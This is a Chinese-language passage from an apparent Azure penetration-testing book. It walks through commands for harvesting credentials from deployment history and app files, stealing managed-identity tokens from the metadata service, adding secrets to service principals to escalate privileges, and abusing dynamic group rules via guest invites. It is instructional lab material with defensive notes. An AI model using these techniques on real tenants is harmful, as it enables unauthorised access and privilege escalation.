  \ – 是一个强大的经过身份验证的枚举工具。它所做的不仅仅是我们在这里能够审查的内容，我们将在后面的练习中再次使用它。你可以查看 Az 目录的内容以查看其他枚举输出结果。\n\
  \n> **重要说明**\n> \n> 对于较大的环境，你可能需要限制 MicroBurst 收集的信息。通过使用与参数关联的布尔标志（Users、Groups\
  \ 等），你可以禁用收集你可能不需要的信息。请注意，对于拥有大量用户的租户，用户和组的收集可能需要很长时间。\n\n现在我们已经枚举了可用资源，让我们将重点转向\
  \ Reader 角色可访问的、通常包含凭据的位置。\n\n### 审查常见的明文数据存储\n\n在本节中，我们将审查 Azure 中 Reader 角色可访问的常见区域，其中可能存储明文密码。这些可能是有意的明文密码，但就其大部分而言，这些数据存储将包含意外暴露的凭据。\n\
  \n需要注意的一件重要事情是，一些凭据本意就是以明文形式存在。正如你稍后会看到的，Azure 中存在特定的服务，其中明文密码是预期且作为服务的一部分被利用的。这看起来似乎是一种危险的做法，而且这确实是我们作为攻击者会利用的东西，但只要对凭据周围有适当的授权控制，它们就可以被某些服务安全地使用。\n\
  \n值得一提的是，微软已在此方面有所改进，要求读取/写入权限或更明确的权限才能读取可能存储敏感信息从而提供数据访问的配置。以下是一些示例：\n\n- 读取 Azure\
  \ 存储账户的密钥需要明确的权限，该权限不包含在 Reader 角色的权限中。\n- 读取 Azure App Service 和 Azure Function\
  \ 应用的配置设置需要 Reader 角色不具备的读取/写入权限。\n- 读取可用于访问 Cosmos DB 账户中数据的账户密钥需要 Reader 角色不具备的明确权限。\n\
  \n虽然这是向前迈出的重要一步，但这也可能导致管理员向可能需要访问此类信息的用户或工具授予超出所需的更多权限。当然，如果管理员这样做，那不是微软的错！\n\n\
  在接下来的小节中，我们将介绍渗透测试人员使用 Reader 角色可以搜寻敏感信息的位置。\n\n#### 评估 Azure 资源管理器 (ARM) 部署\n\n\
  Azure 订阅中的每个资源组都维护过去资源部署的历史记录（每个资源组最多 800 个）。可以从 Azure 门户（资源组的 **部署** 刀片；见 *图 4.21*）或以编程方式检查此过去资源部署的历史记录：\n\
  \n正如我们在 *图 4.22* 中的模板参数中所看到的，`adminUsername` 参数设置为 `String`，并且在部署历史记录的输入中可见，如下所示（*图\
  \ 4.23*）。`adminPassword` 参数设置为 `SecureString` 类型，并且未在部署历史记录的输入部分显示：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_156_0.png)\n\
  \n图 4.23 – 门户中示例部署输入\n\n上述配置是正确的做法，但云工程师可能会在模板中错误配置参数类型，导致敏感信息以明文形式暴露。在实际的渗透测试经验中，我们通常看到这种情况发生在资源组中的早期部署中。一旦工程师意识到模板中的错误，他们会为未来的部署进行更正，但他们可能会忘记清理之前已暴露敏感信息的部署。\n\
  \n信息泄露的第二个主要原因是云工程师可能会意外地在模板的输出部分包含敏感值。Azure 模板部署允许工程师在输出部分指定部署后返回的值。这些值可用于将某些值传递给一系列自动化任务中的另一个外部进程。诸如账户密钥、密码或连接字符串等敏感值可能会意外包含在此部分。值得注意的是，即使是\
  \ `SecureString` 参数值也可以在输出部分以纯文本形式输出。你将在下一个实践练习中看到一个示例。\n\n作为攻击者，我们可以使用在部署历史记录中找到的敏感值来推进攻击链。通常，部署模板会更改为使用安全字符串，但密码保持不变。还应注意，平均\
  \ Azure 租户将拥有大量部署的资源。为了高效地审查这些部署，我们需要使用自动化工具和 Az PowerShell 模块。\n\n\n\n\n- 2. 检查文件中的参数和输出部分，查找暴露的凭据。你可以搜索\
  \ `Outputs` 和 `Parameters` 来更快地定位相关信息：\n\n  ![](img/4fa338e84e0a590967a142dd798ba4e2_158_0.png)\n\
  \n  图 4.25 – 文件中暴露的 SSH 凭据\n\n  你应当能够找到某个先前部署中暴露的 Linux VM 的主机名、用户名和密码。请复制 SSH 命令输出，因为你需要使用找到的凭据连接到该\
  \ Linux VM。同时，复制密码值。\n\n- 3. 在你的渗透测试 VM 的 PowerShell 会话中，粘贴你在*步骤 2*中复制的 SSH 命令，然后按*Enter*（PowerShell\
  \ 现已原生支持 SSH）。当提示指纹时，输入`yes`并按*Enter*。在提示输入密码时，输入你从*步骤 2*复制的密码，然后按*Enter*：\n\n \
  \ ```powershell\n  PS C:\\> ssh linuxadmin@<azure_vm_host>\n  ```\n\n  以下是命令截图：\n\
  \n  ![](img/4fa338e84e0a590967a142dd798ba4e2_158_1.png)\n\n  图 4.26 – 向测试系统进行身份验证\n\
  \n虽然这是我们环境中的一个测试系统，但你可能希望避免向已在测试中入侵的系统添加额外工具。在这种情况下，`jq` 可以帮助我们获得格式良好的 JSON 输出。以下是该命令及其输出的截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_160_0.png)\n\n图 4.27 – 元数据服务响应示例\n\n\
  输出将包含有关 VM 的计算、网络、磁盘和其他配置的信息。\n\n- 5. 使用以下命令检查 VM 是否有关联的托管身份。如果使用了托管身份，将返回一个 `access_token`，这可能会提供提升权限的机会：\n\
  \n  ```bash\n  root@LinuxVM:~# curl -H Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'\
  \ | jq\n  ```\n\n  以下是命令及其输出的截图：\n\n  ![](img/4fa338e84e0a590967a142dd798ba4e2_160_1.png)\n\
  \n  图 4.28 – 元数据令牌输出示例\n\n你可以在这里看到，我们获得了 Azure 管理平面（Resource Manager）的访问令牌。现在可以使用此令牌与\
  \ Azure REST API 进行交互。MicroBurst 工具集包含一组函数，可以使用这些令牌与 API 交互，以收集 Key Vault 机密和存储帐户密钥，甚至可以在\
  \ VM 上运行命令。我们将在下一章中介绍其中一些功能，但了解如何获取令牌是很有用的。\n\n虽然我们可以将访问令牌与 Azure REST API 一起使用，但使用\
  \ Azure CLI 与订阅交互要容易得多。由于这是我们自己的测试环境（而不是客户的），让我们安装 Azure CLI 来检查此 VM 拥有的权限。\n\n\
  - 6. 使用以下命令在 Linux 系统上安装 Azure CLI：\n\n  ```bash\n  root@LinuxVM:~# curl -sL https://aka.ms/InstallAzureCLIDeb\
  \ | sudo bash\n  ```\n\n- 7. 使用以下命令通过 VM 的托管身份登录：\n\n  ```bash\n  root@LinuxVM:~#\
  \ az login --identity\n  ```\n\n  以下是命令及其输出的截图：\n\n  ![](img/4fa338e84e0a590967a142dd798ba4e2_161_0.png)\n\
  \n  图 4.29 – 使用托管身份进行 Az CLI 登录\n\n### 利用 App Service 配置\n\nAzure App Service 是\
  \ Microsoft 提供的用于在云中托管 Web 应用程序和 API 的服务。虽然我们在上一章中从高层介绍了它们，但这里将重点介绍订阅中 Reader 角色可用的具体配置。\n\
  \n在本节中，我们将研究 App Service 和 Function App 中的一些重要配置项，以进一步攻击这些服务。\n\n#### Azure App\
  \ Service 应用\n\nApp Service 应用的匿名枚举已在*第 3 章，发现 Azure 服务和漏洞*中介绍过。在本节中，我们将介绍如何使用 Reader\
  \ 角色访问权限找到所有应用程序。完整的应用程序列表将为我们提供更好的攻击面，并可能使我们找到订阅的外部入口点。\n\n使用门户，可以相当容易地在 **App\
  \ Service** 菜单中识别任何可用的应用服务。然而，使用 PowerShell 收集所有需要的应用程序信息要方便得多。\n\n要收集这些信息，我们可以使用\
  \ Az PowerShell 模块和以下命令：\n\n```powershell\nPS C:\\> Get-AzWebApp\n\nGitRemoteName\
  \             :\nGitRemoteUri              :\nGitRemoteUsername         :\nGitRemotePassword\
  \         :\nAzureStorageAccounts      :\nAzureStoragePath          :\nState   \
  \                  : Running\nHostNames                 : {azurepentesting-function.azurewebsites.net}\n\
  RepositorySiteName        : azurepentesting-function\nUsageState               \
  \ : Normal\nEnabled                   : True\nEnabledHostNames          : {azurepentesting-function.azurewebsites.net,\
  \ azurepentesting-function.scm.azurewebsites.net}\nAvailabilityState         : Normal\n\
  \n[Truncated]\n```\n\n作为订阅中的 Reader 角色，我们对 Function App 的操作选项有限，但可用的选项可能非常有影响力。本节将介绍两个选项：\n\
  \n- **读取 Function App 代码**\n- **读取应用文件**\n\n读取 Function App 代码是一个相当简单的过程。作为 Reader，我们可以导航到各个\
  \ Function App，进入 **Functions** 部分，并查看各个函数：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_165_0.png)\n\
  \n图 4.31 – 访问 Function App 函数\n\n进入函数菜单后，我们可以导航到 **Code + Test** 部分，该部分允许我们查看函数的源代码。任何做过源代码审查的人都知道，开发人员为了应用程序运行，经常会在代码中隐藏一些东西。这通常会导致注释、密码和非常脆弱的函数很容易被任何有权访问代码的人识别出来。\n\
  \n作为具有 Reader 访问权限的攻击者，我们可以查看这段代码，以提取有关应用程序的有价值信息，并可能收集可用于横向移动的凭据。\n\n这里值得注意的是，能否读取\
  \ Function App 中的代码取决于所使用的开发方法和部署类型。例如，如果在本地（而非门户中）进行开发并使用 Web Deploy 部署，则代码将不可见。对于\
  \ C# 等编译语言也是如此：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_166_0.png)\n\n图 4.32\
  \ – 易受攻击的函数示例\n\nFunction App 中另一个有价值的信息来源是 Function App 的 **App files** 边栏选项卡。虽然大多数基本\
  \ Function App 只包含一个 `host.json` 文件，但我们已经看到多个函数在其函数应用程序中暴露了更敏感的文件。\n\n在此示例中，我们可以看到应用文件中有一个\
  \ `appsettings.json` 文件，并且我们能够看到一个客户端 ID 和机密，可用于以 Azure AD 应用注册身份进行身份验证：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_166_1.png)\n\
  \n图 4.33 – 易受攻击的应用文件示例\n\n通常，这些凭据最终会被硬编码到函数和设置文件中，因为开发人员可能会在应用程序的身份管理方面走捷径。作为一种更安全的选择，开发人员应考虑将托管身份与\
  \ Function App 配合使用。\n\n作为攻击者，我们现在拥有了可用于向 Az PowerShell 模块和 Azure CLI 进行身份验证的应用注册凭据。此示例不在我们的测试环境中，但提供该示例是为了让你了解遇到这些凭据时可以做些什么。\n\
  \n在以下示例中，我们使用在 Function App 中发现的凭据向订阅进行身份验证：\n\n- 1. 首先，我们将使用以下命令将从 Function App\
  \ 收集的凭据存储为变量。在凭据提示符下，我们输入从 Function App 获取的客户端 ID 和机密：\n\n  ```powershell\n  PS\
  \ C:\\> $credential = Get-Credential\n  ```\n\n  以下是其在 PowerShell 中的显示效果：\n\n  ![](img/4fa338e84e0a590967a142dd798ba4e2_167_0.png)\n\
  \n  图 4.34 – Get-Credential 提示符示例\n\n\n\n\n\n2. 然后，我们使用以下 PowerShell 命令，通过之前定义的变量对\
  \ Azure 订阅进行身份验证。请注意，我们需要将租户参数改为相应的租户 ID：\n\n```powershell\nPS C:\\> Connect-AzAccount\
  \ -ServicePrincipal -Credential $credential -Tenant 40d5707e-b434-4f10-9d7d-21842b956935\n\
  ```\n\n3. 完成身份验证后，可以通过以下 PowerShell 命令确认访问权限：\n\n```powershell\nPS C:\\> Get-AzContext\n\
  ```\n\n也可以使用以下 Azure CLI 命令完成同样操作，将 `--u` 参数替换为你的客户端 ID，将 `--tenant` 参数替换为你的租户 ID，以对租户进行身份验证：\n\
  \n```powershell\nPS C:\\> az login --service-principal -u d361f31d-844b-4a8d-9abc-948aaee241b4\
  \ --tenant 40d5707e-b434-4f10-9d7d-21842b956935\n```\n\n请注意，服务主体需要被分配订阅才能进行身份验证。上述命令还会提示输入密码。也可以将密码（客户端机密）作为命令行参数传入。\n\
  \n### 利用配置错误的服务主体提升权限\n\n在寻找权限提升机会时，不仅要检查现有用户的角色分配，还要关注其他可被利用的错误配置。一个例子是检查具有读者角色的用户是否拥有某个服务主体的所有权，而该服务主体拥有的权限比读者用户更多。\n\
  \n*图 4.35* 展示了这种攻击的工作原理：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_169_0.png)\n\
  \n图 4.35 – 利用配置错误的服务主体\n\n具体细节如下：\n\n1. `readeruser` 最初仅拥有对 Azure 资源的只读权限。\n\n2.\
  \ 该用户为其正在构建的应用程序注册了一个服务主体（默认情况下，Azure AD 租户的所有成员用户都可以注册应用程序）。此外，由于该用户注册了该应用程序，*他们自动成为所有者*（服务主体账户的所有权权限允许用户设置可用于身份验证的凭据（证书和机密），正如我们刚刚演示的那样）。\n\
  \n3. 具有更高权限的管理员将贡献者角色或更高权限的角色分配给 `readeruser` 注册的应用程序。\n\n4. 这为 `readeruser` 的凭据提供了一条利用途径，通过向应用添加新机密来提升权限，因为他们是该应用的所有者。\n\
  \n5. 然后可以使用应用 ID 和新机密来提升权限。\n\n在下一个动手练习中，我们将使用 PowerZure 中的一个强大功能来识别应用注册的所有者，并向应用添加凭据。`Get-AzureAppOwner`\
  \ 命令是 PowerZure 的功能之一。它会递归查看 Azure AD 中每个已注册的应用程序并列出其所有者。输出显示 `readeruser` 被指定为名为\
  \ `customapp` 的应用程序的所有者。所有权允许对应用拥有不同权限，包括添加新机密。虽然这不是读者角色的固有权限，但应用程序所有权权限可以被分配给任何账户：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_171_0.png)\n\n图 4.37 – 读者账户拥有的示例应用\n\n\
  3. 使用以下命令向 `customapp` 添加一个新机密，以便我们使用该应用进行身份验证。请记住，我们是以被分配了读者角色的用户身份执行所有这些操作的：\n\
  \n```powershell\nPS C:\\> Add-AzureSPSecret -ApplicationName customapp -Password\
  \ myPassword456\n```\n\n太棒了！新机密已成功添加。这意味着我们可以使用刚刚设置的机密作为该服务主体进行身份验证，然后探索其权限。请记下显示的应用\
  \ ID 和租户 ID，因为我们需要这两项来以服务主体身份进行身份验证（两者均在图 4.38 中用箭头标出）：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_171_1.png)\n\
  \n图 4.38 – `Add-AzureSPSecret` 的示例输出\n\n### **重要说明**\n\n尽管对应用注册修改有明确的监控，但通过手动分析可能很难检测到，尤其是在可能存在数千个服务主体的环境中。此外，添加凭据不会影响已为服务主体配置的现有机密。这意味着任何使用服务主体现有机密的应用程序将继续无中断地正常工作。\n\
  \n从蓝队或防御角度来看，Azure AD 审核日志会将这些事件记录为活动类型 **更新应用程序 – 证书和机密管理**。Azure Resource Graph\
  \ 和应用程序变更分析在调查时也很有帮助。\n\n4. 切换到 WSL，并使用以下命令以服务主体身份进行身份验证。将 `APP_ID` 替换为你在*第 3 步*中记下的应用\
  \ ID。将 `TENANT_ID` 替换为你在*第 3 步*中记下的租户 ID。按*回车*：\n\n```bash\nPS C:\\> bash\npentestadmin@PentestVM:~#\
  \ sudo su -\nroot@PentestVM:~# az login --service-principal --username APP_ID --password\
  \ myPassword456 --tenant TENANT_ID\n```\n\n以下是该命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_172_0.png)\n\
  \n图 4.39 – 使用凭据进行的示例 Az CLI 登录\n\n你现在已作为服务主体登录。接下来，我们将验证该服务主体拥有的权限。\n\n5. 使用以下命令验证服务主体的角色分配和范围。将\
  \ `APP_ID` 替换为你在*第 3 步*中记下的应用 ID：\n\n```bash\nroot@PentestVM:~# az role assignment\
  \ list --assignee APP_ID --include-groups --include-inherited --query '[].{username:principalName,\
  \ role:roleDefinitionName, usertype:principalType, scope:scope}'\n```\n\n你可以看到，该服务主体在订阅范围内被分配了贡献者角色。太棒了！我们找到了一条通向角色分配的路径，该分配赋予我们的权限比当前用户更多！\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_173_0.png)\n\n虽然读者角色（Azure AD 中的全局读者和\
  \ Azure RBAC 中的读者）通常不具有服务主体的所有权权限，但请记住，Azure AD 租户中的成员用户有权注册应用程序，并且他们会自动成为其注册的应用程序的所有者。此外，偶尔也会出现将所有权权利授予用户的情况。由于这些所有权权利可能出现在任何角色级别，我们认为最好尽早处理这些问题。\n\
  \n读者角色始终可用的一项权限是连接并从 **Azure 容器注册表（ACR）** 拉取镜像的能力。这些权限不允许读者更改镜像，但确实允许他们查看镜像。\n\n\
  ```bash\nroot@PentestVM:~# az login -u readeruser@<DOMAIN> -p myPassword123\n```\n\
  \n以下是命令输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_175_0.png)\n\n图 4.41 –\
  \ 使用读者账户进行的示例 Az 登录\n\n2. 使用以下命令列出订阅中的容器注册表：\n\n```bash\nroot@PentestVM:~# az acr\
  \ list -o table\n```\n\n你可以看到有一个名称格式为 `acrXXXX` 的容器注册表（其中 XXXX 是部署期间随机生成的数字）。记下此名称：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_175_1.png)\n\n图 4.42 – 示例生成的 ACR\n\n\
  3. 使用以下命令在 WSL 上安装 Docker：\n\n```bash\nroot@PentestVM:~# apt update && apt install\
  \ docker.io -y\n```\n\n4. 使用以下命令为注册表生成 Docker 登录。将 `ACR_NAME` 替换为你在*第 2 步*中记下的实际名称。另外，使用生成的令牌连接到注册表：\n\
  \n```bash\nroot@PentestVM:~# acr=ACR_NAME\nroot@PentestVM:~# loginserver=$(az acr\
  \ login -n $acr --expose-token --query loginServer -o tsv)\nroot@PentestVM:~# accesstoken=$(az\
  \ acr login -n $acr --expose-token --query accessToken -o tsv)\nroot@PentestVM:~#\
  \ docker login $loginserver -u 00000000-0000-0000-0000-000000000000 -p $accesstoken\n\
  ```\n\n以下是该命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_176_0.png)\n\n\
  图 4.43 – 示例输出\n\n5. 使用以下命令列出容器注册表中的镜像：\n\n```bash\nroot@PentestVM:~# az acr repository\
  \ list -n $acr\n```\n\n你将看到一个名为 `nodeapp-web` 的单一仓库：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_176_1.png)\n\
  \n图 4.44 – 仓库镜像列表\n\n\n\n\n\n8. 以管理员身份打开一个新的 PowerShell 控制台。将 **步骤 4** 中的值设为变量。将\
  \ `LOGIN_SERVER` 和 `ACCESS_TOKEN` 替换为 **步骤 4** 中的值：\n\n   ```powershell\n   PS C:\\\
  > $loginserver=\"LOGIN_SERVER\"\n   PS C:\\> $accesstoken=\"ACCESS_TOKEN\"\n   ```\n\
  \n9. 要将镜像从注册表拉取到本地缓存，你需要使用 PowerShell 控制台（而不是 WSL）。这是因为 WSL 无法访问本地安装的 Docker 应用程序。Windows\
  \ 10 的较新版本（build 18362 或更高）支持此功能，但在我们的实验室 VM 上的构建版本中尚未支持。\n\n10. 从 PowerShell 控制台连接到容器注册表：\n\
  \n    ```powershell\n    PS C:\\> docker login $loginserver -u 00000000-0000-0000-0000-000000000000\
  \ -p $accesstoken\n    ```\n\n11. 使用以下命令将镜像从容器注册表拉取到本地缓存：\n\n    ```powershell\n\
  \    PS C:\\> docker pull $loginserver/nodeapp-web:v1\n    ```\n\n以下是命令及其输出的截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_178_0.png)\n\n我们可以测试此凭据以查看它是否仍然有效以及其拥有的访问级别。请记下\
  \ APP_ID、APP_KEY 和 TENANT_ID 值。\n\n14. 切换回你已打开的 WSL 会话。使用以下命令以服务主体身份进行身份验证。将 APP_ID\
  \ 替换为 *步骤 10* 中的 APP_ID 值。将 SECRET_KEY 替换为 *步骤 10* 中的 APP_KEY 值。将 TENANT_ID 替换为\
  \ *步骤 10* 中的 TENANT_ID 值。按 *Enter*：\n\n    ```bash\n    root@PentestVM:~# az login\
  \ --service-principal --username APP_ID --password SECRET_KEY --tenant TENANT_ID\n\
  \    ```\n\n你现在已作为服务主体登录。接下来，我们将验证此服务主体拥有的权限。\n\n15. 使用以下命令验证服务主体的角色分配和范围。将 APP_ID\
  \ 替换为 *步骤 10* 中的 APP_ID 值：\n\n    ```bash\n    root@PentestVM:~# az role assignment\
  \ list --assignee APP_ID --include-groups --include-inherited --query '[].{username:principalName,\
  \ role:roleDefinitionName, usertype:principalType, scope:scope}'\n    ```\n\n你可以看到，此服务主体在订阅范围内被分配了\
  \ Contributor 角色。太棒了！我们已成功利用从容器注册表中的镜像中搜集到的凭据，将权限从 Reader 角色提升到 Contributor 角色！\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_180_0.png)\n\n在本章的这一点，你可以关闭打开的窗口，因为本章的其余部分将涵盖\
  \ Azure 门户中的场景。下一个场景将专门针对具有 Azure AD Reader 权限的用户。需要注意的一点是，下一个场景甚至可能被没有订阅的 Azure\
  \ AD 用户利用。\n\n### 利用动态组成员身份\n\n本章的最后一部分介绍如何操作 Azure AD 账户详细信息以使账户符合动态组成员身份的条件。目前，我们经常看到动态组用于设备管理和账户的地理分组。随着越来越多的组织将\
  \ Active Directory 管理迁移到 Azure AD，这些动态组将变得更加流行。\n\n如 *第 1 章、Azure 平台和架构概述* 中所述，动态组成员身份基于为\
  \ Azure AD 账户关联的参数设置的规则。这些规则可能简单到将来自特定城市的所有用户添加到组中。规则可以配置的方式有多种，因此在实际场景中我们可能会看到一些相当有趣的组成员身份逻辑。\n\
  \n对于此示例场景，我们将查看 azurepentesting 租户中的 **Dynamic Admins** 组。此组有一条规则，允许电子邮件地址中包含单词\
  \ admin 的任何用户成为该组的成员。该组还为订阅应用了 Owner 角色。以下是动态规则的示例：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_181_0.png)\n\
  \n图 4.50 – 示例动态组成员身份规则\n\n虽然此 Azure AD 租户的管理员可能认为该组已适度锁定，但他们没有考虑到一个致命弱点。在我们的示例租户中，我们允许访客账户。组织需要一些外部协作选项，因此我们所有用户默认都可以邀请外部访客账户。\n\
  \n这次攻击的优点是，初始用户无需在订阅上拥有任何权限即可执行攻击。他们只需要能够邀请访客用户。虽然查看 IAM 权限很有帮助，但在此情况下的任何用户都可以查看一个动态组（`subscriptionOwners`）并做出一些假设。\n\
  \n作为具有 Azure 门户访问权限的用户，我们可以邀请一个新用户，该用户的电子邮件地址恰好包含 admin：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_182_0.png)\n\
  \n图 4.51 – 用户邀请屏幕\n\n这会导致向 `admin@fosaaen.com` 账户发送邀请邮件，用户可以接受对租户的访问。\n\n这里需要注意的一个重要步骤是需要使用现有的\
  \ Azure 账户作为邀请的收件人。你可以为特定电子邮件地址创建邀请，但该电子邮件需要在另一个租户（Microsoft 或其他）中创建 Azure 用户后，才能正式添加到你的受害租户中。此外，用户需要满足从受害租户下推的任何\
  \ MFA 和条件访问要求。\n\n一旦访客账户添加并准备就绪，我们可以看到用户现在已应用 Owner 角色并成为动态组的成员：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_183_0.png)\n\
  \n图 4.52 – 动态组成员身份示例\n\n从实用性角度来看，我们可能不会看到大量动态组被用来授予 Azure 订阅的权限。然而，我们在咨询项目中见过各种各样的客户端环境，并可以证明在\
  \ Azure AD 中实施了更奇怪的配置。\n\n> **重要说明**\n>\n> 有关此攻击的更多信息，请查看 Cody Burkard 在 Mnemonic\
  \ 博客上对此技术的原始博文：https://www.mnemonic.no/blog/abusing-dynamic-groups-in-azure/。\n\n\
  至于此问题的缓解措施，我们建议将动态组成员身份规则设置为基于用户无法控制的参数进行操作。此外，锁定访客账户访问权限以防止访客用户操作自己的账户也会有所帮助。\n\
  \n### 实践练习 – 清理 Owner 利用场景\n\n在此最终练习中，我们将使用清理脚本自动删除本章场景中设置的资源。以下是本练习中将完成的任务：\n\n\
